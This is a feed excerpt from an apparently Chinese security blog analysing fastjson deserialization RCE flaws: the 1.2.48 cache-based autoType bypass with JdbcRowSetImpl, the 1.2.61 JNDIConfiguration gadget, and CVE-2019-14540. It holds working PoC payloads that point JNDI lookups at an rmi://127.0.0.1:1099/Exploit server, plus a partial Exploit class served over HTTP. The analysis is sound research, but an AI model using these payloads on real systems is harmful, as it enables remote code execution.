class="keyword">if</span>(classLoader != <span class="keyword">null</span>)&#123;</span><br><span class="line">            clazz = classLoader.loadClass(className);</span><br><span class="line">            <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">                mappings.put(className, clazz);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="keyword">if</span>(contextClassLoader != <span class="keyword">null</span> &amp;&amp; contextClassLoader != classLoader)&#123;</span><br><span class="line">            clazz = contextClassLoader.loadClass(className);</span><br><span class="line">            <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">                mappings.put(className, clazz);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        clazz = Class.forName(className);</span><br><span class="line">        <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">            mappings.put(className, clazz);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>而在TypeUtils.java的1105行 <code>TypeUtils.getClassFromMapping</code>函数，从<code>mapping</code>中取出类名。<br><img src="https://i.loli.net/2020/01/30/1bo9zxstH7ZBy6i.jpg" alt="-w737"></p><p>继续跟进，在1127行有一段对未开启<code>autoType</code>的处理，又是一段黑白名单的处理：<br><img src="https://i.loli.net/2020/01/30/9aYVRGiBZpuOS3j.jpg" alt="-w1068"></p><p>接着加载了<code>org.apache.commons.configuration2.JNDIConfiguration</code>模块：<br><img src="https://i.loli.net/2020/01/30/F1MEuN7wkjWIRvD.jpg" alt="-w1326"><br>同时这里判断了其是否有jsonType，<code>jsonType = visitor.hasJsonType();</code>，是fastjson中定制序列化的特性，参考文档<a href="https://www.w3cschool.cn/fastjson/fastjson-serializefilter.html" target="_blank" rel="noopener">Fastjson 定制序列化</a>和<a href="https://www.w3cschool.cn/fastjson/fastjson-jsonfield.html" target="_blank" rel="noopener">Fastjson JSONField介绍</a></p><blockquote><p>挖坑，这里用到了ASM读写字节码的类库，参考文章<a href="http://www.blogjava.net/DLevin/archive/2014/06/25/414292.html" target="_blank" rel="noopener">深入ASM源码之ClassReader、ClassVisitor、ClassWriter</a>。<br>后来还看到可以用注解有JsonType的class进行gadget chain构造，先挖坑，<a href="https://xz.aliyun.com/t/7107?accounttraceid=2115e68bd6bf4212896bb68f3442ba84zyan" target="_blank" rel="noopener">https://xz.aliyun.com/t/7107</a></p></blockquote><p>继续往下跟，这里只要开了<code>autoTypeSupport</code>就会将我们的class缓存进<code>mapping</code>(<code>cacheClass</code>为<code>true</code>即缓存)<br><img src="https://i.loli.net/2020/01/30/VokgwfIMrGZc39W.jpg" alt="-w1315"></p><p>最后返回class。<br><img src="https://i.loli.net/2020/01/30/eCJrQWjnTwyVZIU.jpg" alt="-w988"><br>通过<code>autotype</code>的检测，进行反序列化操作<br><img src="https://i.loli.net/2020/01/31/fPb81IJ9RaU3zix.jpg" alt="-w1197"></p><p>到这里基本从源码对fastjson解析json、<code>@type</code>特殊类型解析、<code>autotype</code>检测有了一个了解。</p><h2 id="fastjson-1-2-48-JdbcRowSetImpl-gadget-分析-缓存绕过autotype"><a href="#fastjson-1-2-48-JdbcRowSetImpl-gadget-分析-缓存绕过autotype" class="headerlink" title="fastjson 1.2.48 JdbcRowSetImpl gadget 分析(缓存绕过autotype)"></a>fastjson 1.2.48 JdbcRowSetImpl gadget 分析(缓存绕过autotype)</h2><p>pom.xml添加下面这段代码<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.alibaba/fastjson --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.47<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>poc:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        String poc1 = <span class="string">"&#123;\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"&#125;"</span>;</span><br><span class="line">        String poc2 = <span class="string">"&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/Exploit\",\"autoCommit\":true&#125;"</span>;</span><br><span class="line">        JSON.parse(poc1);</span><br><span class="line">        JSON.parse(poc2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/01/31/oBtPrIJRpQAm65Z.jpg" alt="-w1266"><br>或者使用数组或者在web服务连续发两个poc包即可：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        String poc2 = <span class="string">"[&#123;\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"&#125;,&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/Exploit\",\"autoCommit\":true&#125;]"</span>;</span><br><span class="line">        JSON.parseObject(poc2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>下断点根进第一个poc：<br><img src="https://i.loli.net/2020/01/31/wToi1dksLX3EZ9Y.jpg" alt="-w1414"></p><p>和上文1.2.61调试的过程类似<code>DefaultJSONParser</code>函数初始化配置，<code>parser.parse</code>解析，再到<code>parseObject</code>函数，这里直接来看<code>config.checkAutoType</code>在不开启<code>autotype</code>的情况：ParserConfig.java#checkAutoType<br><img src="https://i.loli.net/2020/01/31/osIwTQBPZ248HO3.jpg" alt="-w1224"></p><p>最开始进行class名的哈希运算，然后是开启autotype下的黑白名单检测，然后还没到后边未开启autotype的if条件里，就直接return了。</p><p>回到DefaultJSONParser.java#parseObject函数<br><img src="https://i.loli.net/2020/01/31/onvF7um92BgfbXw.jpg" alt="-w1269"><br>跟进<code>deserializer.deserialze</code>函数，根据<code>val</code>字段来获取<code>objVal</code>：<br><img src="https://i.loli.net/2020/01/31/f8HUIp7BdweMsoL.jpg" alt="-w1235"></p><p><img src="https://i.loli.net/2020/01/31/ftviFxZ8EKIRC9y.jpg" alt="-w675"></p><p>继续往下，在335行进行了一个<code>Class</code>类的判断，然后调用<code>typeUtils.loadClass</code>函数：<br><img src="https://i.loli.net/2020/01/31/aFyEhzP2xdYAXen.jpg" alt="-w1287"></p><p>TypeUtils.java#loadClass(String className, ClassLoader classLoader)<br><img src="https://i.loli.net/2020/01/31/pVZyS2oew1kC4LP.jpg" alt="-w1419"><br>用重载的方式，并且设置默认为<code>true</code>的缓存操作，最后在TypeUtils.java#1242行将<code>com.sun.rowset.JdbcRowSetImpl</code>加到mapping缓存中：<br><img src="https://i.loli.net/2020/01/31/rWDZOhfURB64Vy9.jpg" alt="-w1243"></p><p>这就导致了解析第二个poc时，绕过了autotype校验，从缓存mapping中加载：<br><img src="https://i.loli.net/2020/01/31/XMrcVbxS8L16I9J.jpg" alt="-w1464"><br><img src="https://i.loli.net/2020/01/31/T9yR35jpoaAU2le.jpg" alt="-w1104"><br>最终实例化该类，导致RCE。</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>这篇文章通过fastjson1.2.61 commons-configuration gadget的POC动态调试入手，分析fastjson反序列化解析json流程，分析了一下源码的<code>\u</code>和<code>\x</code>的16进制解码操作，以及缓存机制。</p><p>同时分析了一下在fastjson 1.2.48以下<code>TypeUtils.loadClass</code>缓存问题，即无需开autotype可以命令执行。</p><p>接下来的时间打算研究一下高版本jdk绕过远程类的加载问题。</p><p>参考文章：</p><ul><li><a href="https://github.com/alibaba/fastjson/wiki/FastJson-%E6%96%87%E6%A1%A3%E9%93%BE%E6%8E%A5" target="_blank" rel="noopener">FastJson 文档链接</a></li><li><a href="https://www.w3cschool.cn/fastjson/fastjson-api.html" target="_blank" rel="noopener">W3Cschool:Fastjson API中文版</a></li><li><a href="https://zonghaishang.gitbooks.io/fastjson-source-code-analysis/content/" target="_blank" rel="noopener">fastjson源码解析</a></li><li><a href="https://xz.aliyun.com/t/7107" target="_blank" rel="noopener">fastjson反序列化RCE核心-四个关键点分析</a></li><li><a href="https://paper.seebug.org/994/" target="_blank" rel="noopener">https://paper.seebug.org/994/</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Web" scheme="http://0day.design/categories/Web/"/>
    
    
      <category term="Java" scheme="http://0day.design/tags/Java/"/>
    
      <category term="漏洞分析" scheme="http://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="fastjson" scheme="http://0day.design/tags/fastjson/"/>
    
  </entry>
  
  <entry>
    <title>fastjson 1.2.61 远程代码执行漏洞分析(commons-configuration gadget)</title>
    <link href="http://0day.design/2020/01/28/fastjson%201.2.61%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://0day.design/2020/01/28/fastjson 1.2.61 远程代码执行漏洞分析/</id>
    <published>2020-01-28T13:45:00.000Z</published>
    <updated>2020-01-31T02:16:09.114Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>在fastjson 1.2.61的版本中，增加了autoType的安全组件黑名单commons-configuration，成功绕过了黑名单限制，利用反序列化特性造成远程代码执行，该组件是java应用程序的配置管理类，用于协助管理各种格式的配置文件。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>Idea创建项目，选择maven，jdk版本1.8.0_73，在pom.xml中添加如下代码,自动加载依赖：</p><ul><li>fastjson:1.2.60</li><li>commons-configuration2: 2.6</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.alibaba/fastjson --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.60<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.commons/commons-configuration2 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-configuration2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>同样的，按照<a href="https://0day.design/2020/01/28/CVE-2019-14540%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">上一篇文章</a>文章中写的，搭建一个恶意的RMI服务，使之加载。<br>poc:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        String poc = <span class="string">"&#123;\"@type\":\"org.apache.commons.configuration2.JNDIConfiguration\",\"prefix\":\"rmi://127.0.0.1:1099/Exploit\"&#125;"</span>;</span><br><span class="line">        ParserConfig.global.setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">        JSON.parseObject(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/01/28/trlqBy5D72CvXdE.jpg" alt="-w1479"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在<a href="https://0day.design/2020/01/28/CVE-2019-14540%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">上一篇文章</a>中写了fastjson在反序列化json数据时，会自动调用其属性XX的<code>setXX</code>和<code>getXX</code>方法，如果其中有<code>JNDI Reference</code>注入漏洞，则可以造成RCE的效果。</p><p>在下面这段代码中，我们可以知道在使用<code>JSON.parseObject</code>反序列化json数据时，会调用所有属性的get方法，以及相关属性的set方法。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getAge方法被自动调用！"</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"setAge方法被自动调用！"</span>);</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getName方法被自动调用！"</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"setName方法被自动调用！"</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//使用@type指定该JSON字符串应该还原成何种类型的对象</span></span><br><span class="line">        String userInfo = <span class="string">"&#123;\"@type\":\"test.User\",\"name\":\"passer6y\"&#125;"</span>;</span><br><span class="line">        <span class="comment">//开启setAutoTypeSupport支持autoType</span></span><br><span class="line">        ParserConfig.global.setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//反序列化成User对象</span></span><br><span class="line">        JSONObject user = JSON.parseObject(userInfo);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>从下图我们知道，这里没有设置age属性，但是<code>getAge</code>方法被调用了，且先调用<code>set</code>方法后调用<code>get</code>方法。<br><img src="https://i.loli.net/2020/01/28/aYRC2y7PGr3SXHi.jpg" alt="-w1118"></p><p>再回过头来看这个poc:<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String poc = "&#123;\"@type\":\"org.apache.commons.configuration2.JNDIConfiguration\",\"prefix\":\"rmi://127.0.0.1:1099/Exploit\"&#125;";</span><br></pre></td></tr></table></figure></p><p>跟进这个组件的<code>setPrefix</code>方法：<br><img src="https://i.loli.net/2020/01/28/BrZ8EnK1uXOvN2h.jpg" alt="-w982"><br>再跟一下成员变量<code>this.prefix</code>：<br><img src="https://i.loli.net/2020/01/28/1CHwVoucj4AFYxq.jpg" alt="-w1370"><br>所以漏洞成因就显而易见了，通过第一步的<code>setPrefix</code>种入成员变量<code>this.prefix</code>为恶意rmi服务地址，接着fastjson自动调用全部get方法，没有设置<code>baseContext</code>成员变量，自然就触发了：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Context)<span class="keyword">this</span>.getContext().lookup(<span class="keyword">this</span>.prefix == <span class="keyword">null</span> ? <span class="string">""</span> : <span class="keyword">this</span>.prefix)</span><br></pre></td></tr></table></figure></p><p>那么问题来了，<code>this.getContext()</code>是怎么设置的呢？<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Context <span class="title">getContext</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.context;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>获取了成员变量<code>this.context</code>，在构造方法中我们可以看到一顿套娃的操作，无参构造函数调用单参数构造函数，调用双参数构造函数，将<code>new InitialContext()</code>赋给了成员变量<code>this.context</code><br><img src="https://i.loli.net/2020/01/28/mfDwk2joXgnepP5.jpg" alt="-w1071"><br>最终导致漏洞产生。</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>漏洞影响fastjson版本：<code>version &lt;= 1.2.6</code>。修复也就是多了个组件黑名单。</p><p>索然无味，仅仅对gadget chain进行了简单分析，对fastjson的关键代码分析欠缺，接下里的任务就是搞懂fastjson漏洞触发的条件以及原理。</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Web" scheme="http://0day.design/categories/Web/"/>
    
    
      <category term="Java" scheme="http://0day.design/tags/Java/"/>
    
      <category term="漏洞分析" scheme="http://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-14540 远程代码执行漏洞分析</title>
    <link href="http://0day.design/2020/01/28/CVE-2019-14540%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://0day.design/2020/01/28/CVE-2019-14540 远程代码执行漏洞分析/</id>
    <published>2020-01-28T07:49:00.000Z</published>
    <updated>2020-01-28T12:00:49.296Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h2 id="fastjson入门"><a href="#fastjson入门" class="headerlink" title="fastjson入门"></a>fastjson入门</h2><p>下载<a href="https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.53/fastjson-1.2.53.jar" target="_blank" rel="noopener">fastjson最新版jar包下载</a>，Idea 新建项目-&gt;选择<code>jdk1.7</code>—&gt;选择File &gt; project structure &gt; Modules &gt; dependencies &gt; + JARS or directories -&gt;加载下载的组件<br><img src="https://i.loli.net/2020/01/28/Hzylpc6XgujG79Q.jpg" alt="-w1464"></p><p>写一个User类，接着使用fastjson解析一段json数据：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getAge方法被自动调用！"</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"setAge方法被自动调用！"</span>);</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getName方法被自动调用！"</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"setName方法被自动调用！"</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//使用@type指定该JSON字符串应该还原成何种类型的对象</span></span><br><span class="line">        String userInfo = <span class="string">"&#123;\"@type\":\"test.User\",\"name\":\"passer6y\", \"age\":18&#125;"</span>;</span><br><span class="line">        <span class="comment">//开启setAutoTypeSupport支持autoType</span></span><br><span class="line">        ParserConfig.global.setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//反序列化成User对象</span></span><br><span class="line">        JSONObject user = JSON.parseObject(userInfo);</span><br><span class="line">        <span class="comment">//User user = (User) JSON.parse(userInfo); 只会调用setXX方法</span></span><br><span class="line">        <span class="comment">//System.out.println(user.getName());</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/01/28/GjmiFVUbB2WMvsR.jpg" alt="-w1230"></p><p>在使用<code>JSON.parseObject</code>解析json时，代码中的<code>setXX</code>、<code>getXX</code>方法自动调用，如果函数中存在一些敏感操作，则可能导致漏洞产生。</p><blockquote><p><code>JSON.parse</code>只会调用<code>setXX</code>方法，不会自动调用<code>getXX</code></p></blockquote><p>另外，将json中的age元素删除后，使用<code>JSON.parseObject</code>，仍然会调用<code>getAge</code>方法。<br><img src="https://i.loli.net/2020/01/28/KsS3UEoJnMZNqTi.jpg" alt="-w1155"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>分析10分钟，复现3小时，环境无限采坑…（maven真香</p><h3 id="RMI服务端搭建"><a href="#RMI服务端搭建" class="headerlink" title="RMI服务端搭建"></a>RMI服务端搭建</h3><p>这里使用了RMI动态加载远程class文件，参考笔记：<a href="mweblib://15800918927450" target="_blank" rel="noopener">深入理解RMI&amp;JNDI</a></p><p>使用javac将下面代码编译成class文件，放到web服务器中,这里使用nginx(<a href="http://127.0.0.1/Exploit.class" target="_blank" rel="noopener">http://127.0.0.1/Exploit.class</a>)<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (System.getProperty(<span class="string">"os.name"</span>).toLowerCase().startsWith(<span class="string">"win"</span>)) 